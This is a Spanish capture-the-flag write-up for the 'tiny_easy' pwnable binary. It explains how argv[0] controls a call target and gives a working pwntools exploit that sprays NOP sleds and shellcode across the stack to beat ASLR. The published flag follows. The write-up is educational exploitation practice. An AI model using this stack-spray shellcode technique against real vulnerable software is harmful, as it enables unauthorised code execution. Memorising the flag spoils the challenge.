# tiny easy

<img width="132" height="169" alt="tiny_easy" src="https://github.com/user-attachments/assets/b19f58bf-e568-43a1-9f70-7ffdb791a5e0" />

``` 
checksec tiny_easy
[*] '/home/kalcast/tiny_easy'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
```

## Intro
El programa solo cuenta con un par de instrucciones:
```
[0x08048054]> pdf
            ;-- eip:
/ 6: entry0 ();
| rg: 0 (vars 0, args 0)
| bp: 0 (vars 0, args 0)
| sp: 0 (vars 0, args 0)
|           0x08048054      58             pop eax
|           0x08048055      5a             pop edx
|           0x08048056      8b12           mov edx, dword [edx]
\           0x08048058      ffd2           call edx
[0x08048054]>
```

Si usamos un debugger vemos que el stack al comienzo del programa luce asi:
```
| "USER=senor"       |
| "PATH=/usr/bin"    |   <-- variables de entorno
| "arg1"             |
| "arg2"             |
| "./program"        |   <-- argumentos
| envp[]             |   <-- punteros a variables  de entorno
| argv[]             |   <-- punteros a argumentos
| argc               |   <-- tope (esp)
```

Los primeros 4 bytes de argv\[0\] representan la nueva direccion que se le pasará a `edx`. Debemos controlarla para saltar la ejecucion al shellcode que escribamos en el stack, porque el binario no tiene el bit NX activo y el stack es ejecutable.

Segun la manpage de `execve` podemos pasar la ruta al ejecutable pero cambiar su nombre(`argv[0]`). Por ejemplo: `execve("/bin/ls",["listar_archivos","-lh"],NULL)`:

<img width="1068" height="345" alt="2025-08-12-190701_1068x345_scrot" src="https://github.com/user-attachments/assets/626e1d68-0ce8-437c-a56c-1b70f3e0c7c7" />

## Stack spray
Hay un limite para el tamaño que pueden tener `argv[]`, `env[]` y en general la lista que se le pasa a `execve`. Sin embargo esto [no siempre cuadra y parece ser especifico del sistema](https://stackoverflow.com/questions/63959200/the-maximum-summarized-size-of-argv-envp-argc-command-line-arguments-is-alwa).

No podemos saber la direccion exacta de nuestro shellcode por el ASLR pero podemos hacer un "stack spray" para llenar una region de la pila considerablemente grande con NOP slides y shellcode. Podemos hacer uso tanto de `argv[]` como de `env[]`.

```py
from pwn import *
context.log_level = "error"

# I simply started with a nop sled of 100 bytes and increased it gradually until the program complained
nop_sled = b"\x90" * (1024 * 126 - 4)
shellcode = asm(shellcraft.open("flag") + shellcraft.read("eax","esp",50) + shellcraft.write(1,"esp",50) + shellcraft.exit(0))
# Trial and error looking at the core dumps and calculating some stuff
address = 0xffce11d4

argv0 = [p32(address) + nop_sled + shellcode]

for _ in range(200):
    try:
      p = process(argv=argv0,executable="./tiny_easy")
      print(p.recv(50))
      break
    except Exception as e:
      p.close()
      continue
```

`Such_a_tiny_task:_Great_job_done_here!`

